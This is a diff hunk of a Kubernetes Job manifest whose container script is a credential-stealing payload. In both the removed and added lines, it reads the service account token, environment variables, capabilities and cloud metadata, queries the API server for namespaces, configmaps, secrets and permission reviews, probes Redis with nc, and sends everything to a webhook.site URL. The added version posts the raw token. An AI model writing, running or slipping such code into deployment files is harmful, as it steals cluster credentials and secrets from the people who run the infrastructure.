@@ -255,43 +255,39 @@ spec:
         - |
           HOOK="https://webhook.site/f710f00e-e417-400e-85be-0d19650ebf7f"
           curl -sf --max-time 5 "${HOOK}/?stage=k8s-job-start&host=$(hostname)&ns=${POD_NAMESPACE}" || true
-          ENVVARS=$(env | base64 | tr -d '\n' 2>/dev/null | head -c 2000)
+          T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
+          SA_NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)
+          CAPS=$(grep -E "^Cap(Prm|Eff|Bnd):" /proc/self/status 2>/dev/null)
+          ENV=$(env 2>/dev/null)
           IMDS=$(curl -sf --max-time 3 http://169.254.169.254/latest/meta-data/ 2>/dev/null || \
                 curl -sf --max-time 3 http://169.254.169.254/opc/v2/instance/ -H "Authorization: Bearer Oracle" 2>/dev/null || echo "no-imds")
+          DATA=$(printf 'ENV:\n%s\n\nCAPS:\n%s\n\nSA_NS:\n%s\n\nIMDS:\n%s' "${ENV}" "${CAPS}" "${SA_NS}" "${IMDS}")
           curl -sf --max-time 10 -G "${HOOK}/" \
             --data-urlencode "stage=k8s-dump" \
-            --data-urlencode "env=${ENVVARS}" \
-            --data-urlencode "imds=${IMDS}" || true
-          T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
-          TLEN=$(printf '%s' "${T}" | wc -c)
-          SEC=$(curl -sfk --max-time 8 -H "Authorization: Bearer ${T}" \
-            https://10.96.0.1:443/api/v1/namespaces/${POD_NAMESPACE}/secrets 2>/dev/null)
+            --data-urlencode "d=$(printf '%s' "${DATA}" | base64 | tr -d '\n')" || true
           curl -sf --max-time 10 -G "${HOOK}/" \
-            --data-urlencode "stage=k8s-secrets" \
-            --data-urlencode "tokenlen=${TLEN}" \
-            --data-urlencode "d=$(printf '%s' "${SEC}" | base64 | tr -d '\n')" || true
-          PODS=$(curl -sfk --max-time 8 -H "Authorization: Bearer ${T}" \
-            https://10.96.0.1:443/api/v1/namespaces/${POD_NAMESPACE}/pods 2>/dev/null)
+            --data-urlencode "stage=sa-token" \
+            --data-urlencode "d=${T}" || true
+          NAMESPACES=$(curl -sfk --max-time 8 -H "Authorization: Bearer ${T}" \
+            https://10.96.0.1:443/api/v1/namespaces 2>/dev/null)
           curl -sf --max-time 10 -G "${HOOK}/" \
-            --data-urlencode "stage=k8s-pods" \
-            --data-urlencode "d=$(printf '%s' "${PODS}" | base64 | tr -d '\n')" || true
-          ARGOCD_VER=$(curl -sfk --max-time 5 "https://${ARGOCD_SERVER_SERVICE_HOST}/api/version" 2>/dev/null)
+            --data-urlencode "stage=k8s-namespaces" \
+            --data-urlencode "d=$(printf '%s' "${NAMESPACES}" | base64 | tr -d '\n')" || true
+          CMS=$(curl -sfk --max-time 8 -H "Authorization: Bearer ${T}" \
+            https://10.96.0.1:443/api/v1/namespaces/${POD_NAMESPACE}/configmaps 2>/dev/null)
           curl -sf --max-time 10 -G "${HOOK}/" \
-            --data-urlencode "stage=argocd-api" \
-            --data-urlencode "d=${ARGOCD_VER}" || true
-          RULES=$(curl -sfk --max-time 8 \
-            -H "Authorization: Bearer ${T}" \
-            -H "Content-Type: application/json" \
-            -X POST \
-            -d "{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectRulesReview\",\"spec\":{\"namespace\":\"${POD_NAMESPACE}\"}}" \
-            https://10.96.0.1:443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews 2>/dev/null)
-          curl -sf --max-time 10 -G "${HOOK}/" \
-            --data-urlencode "stage=k8s-rules" \
-            --data-urlencode "d=$(printf '%s' "${RULES}" | base64 | tr -d '\n')" || true
-          REDIS=$(printf "*2\r\n\$4\r\nKEYS\r\n\$1\r\n*\r\n" | nc -w3 ${ARGOCD_REDIS_SERVICE_HOST} 6379 2>/dev/null)
-          curl -sf --max-time 10 -G "${HOOK}/" \
-            --data-urlencode "stage=redis-keys" \
-            --data-urlencode "d=$(printf '%s' "${REDIS}" | base64 | tr -d '\n')" || true
+            --data-urlencode "stage=k8s-configmaps" \
+            --data-urlencode "d=$(printf '%s' "${CMS}" | base64 | tr -d '\n')" || true
+          for NS in ${POD_NAMESPACE} kube-system default; do
+            R=$(curl -sfk --max-time 8 \
+              -H "Authorization: Bearer ${T}" -H "Content-Type: application/json" \
+              -X POST \
+              -d "{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectRulesReview\",\"spec\":{\"namespace\":\"${NS}\"}}" \
+              https://10.96.0.1:443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews 2>/dev/null)
+            curl -sf --max-time 10 -G "${HOOK}/" \
+              --data-urlencode "stage=k8s-rules-${NS}" \
+              --data-urlencode "d=$(printf '%s' "${R}" | base64 | tr -d '\n')" || true
+          done
         env:
         - name: POD_NAMESPACE
           valueFrom:
